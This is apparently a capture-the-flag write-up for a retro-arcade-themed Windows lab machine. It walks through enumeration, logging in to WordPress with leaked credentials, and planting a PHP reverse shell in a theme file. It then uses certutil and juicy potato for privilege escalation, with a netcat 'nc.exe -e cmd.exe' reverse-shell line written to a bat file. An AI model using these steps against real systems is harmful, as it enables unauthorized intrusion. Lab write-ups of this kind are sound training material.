# Less chatting more hacking ðŸ¤¤
Let's jump right into it 

Here were working with a retro arcade, games and all that let's see what it's all about .......

Upon firing up the machine we get an IP address

# Enumeration

First thing for every good security operative is enumeration
so we run an nmap scan to know which ports/services are up and running
![Screenshot_20220411_182142](https://user-images.githubusercontent.com/24994796/163006580-65d9d551-6f35-4a59-9fd7-09db4d275494.png)

We see there's  only two ports running 
Port 80 and 3389
That's
- http and rdp
- It's Good Practice to enumerate as much as you can
Running ffuf on the http service we get to know there's a sub-directory
![Screenshot_20220411_182124](https://user-images.githubusercontent.com/24994796/163007689-28031384-a937-4854-b0aa-e4af24cd3d0c.png)
You can run ffuf recursively or do it as i did
Heading to the retro directory we see it's a site for games and the likes

In our scans and checking the source code we see it's CMS is wordpress 5.2.1
Head over to the log in page (bottom of the website)
We're Greeted with a thpical wordpress login page
All we need is User credentials 
Checking the source code we notice a comment link

Heading to the comment link we get this
![Screenshot_20220411_181132](https://user-images.githubusercontent.com/24994796/163009624-63e36c55-b118-45fa-9b81-ea35ccaead9e.png)
So We can guess the User name is wade and you can try the password from the gotten comment 
Logging in we're greeted with a dashboard

# Exploitation

We can upload an RCE to wordpress CMS we just have to place it well
Your regular pentest monkey rev-shell won't work (didn't work for me)
So let's go for Rev-shell 2.5

[LINK TO THE REV](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php)
Replace the archive.php file
![Screenshot_20220411_221725](https://user-images.githubusercontent.com/24994796/163014318-fe41e4f9-48b6-4897-9710-0f54e670ad66.png)
- Change the ip and port at the bottom of the script  
- start a nc listener 'rlwrap nc -lvnp $port"
- navigate to the archive.php "http://10.10.149.150/retro/wp-content/themes/90s-retro/archive.php"
- Remember Change the IP ðŸ˜´

![Screenshot_20220411_191216(1)](https://user-images.githubusercontent.com/24994796/163015617-adf3ddb7-f8d2-486f-a563-f4a697091fa4.png)
We're in ðŸ˜Ž
- First thing first enumeration
- who are we ?
- What are our Privileges ?

# Seeing SeImpersonate.... is Enabled we can use Juicy Potato for PrivEsc
- Get juicy potato, netcat binary
- Host it on your machine
- Download it in the victim machine(certutil -urlcache -f attacking-ip:port/file file)
Pls note there could be an applocker on windows, In our case there is cos if you try running the exe file you'll get a shell that's stuck 
To avoid that download the exe files and do everything you want to do in the applocker whitelisted path "C:\Windows\System32\spool\drivers\color"
![Screenshot_20220411_213900](https://user-images.githubusercontent.com/24994796/163017202-6638c509-89fa-4fa0-9155-0b91d7cdc067.png)

![Screenshot_20220411_213845](https://user-images.githubusercontent.com/24994796/163017351-98358b37-5a8b-452e-865e-316f8de599ac.png)
So yh everthing seems good 
So now we create a bat file "echo C:\Windows\System32\spool\drivers\color\nc.exe -e cmd.exe Â IP 1515 > reverse.bat"
![Screenshot_20220411_220833](https://user-images.githubusercontent.com/24994796/163017697-95b0f283-9feb-4b10-8ef1-ac868694f249.png)
Running "wmic Service get name,displayname,pathname,startmode" gives us a list of running services
Choosing a CLISD
[Juicy Potato CLISD](https://ohpe.it/juicy-potato/CLSID/Windows_Server_2016_Standard/)

Start a netcat listener in a new tab on your machine with the port in the bat file
